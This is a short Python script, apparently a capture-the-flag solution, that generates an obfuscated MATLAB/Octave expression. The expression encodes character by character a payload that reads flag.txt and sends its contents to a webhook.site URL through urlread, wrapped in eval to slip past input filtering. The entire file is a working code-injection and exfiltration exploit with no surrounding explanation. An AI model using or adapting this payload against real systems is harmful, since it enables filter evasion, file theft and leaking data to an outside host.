s = '{urlread(["http://webhook.site/2a7dac03-d35d-42d5-a87f-88079efa112f/" fileread("flag.txt")])}'


def term(i):
    c = s[i] if i < len(s) else " "
    xi = -10 + 0.2 * i
    n = ord(c)
    return f"{n}*(0.^((x-({xi})).^2))"


res = "+".join([term(i) for i in range(101)])
print("eval(strtrim(char(" + res + ")))")
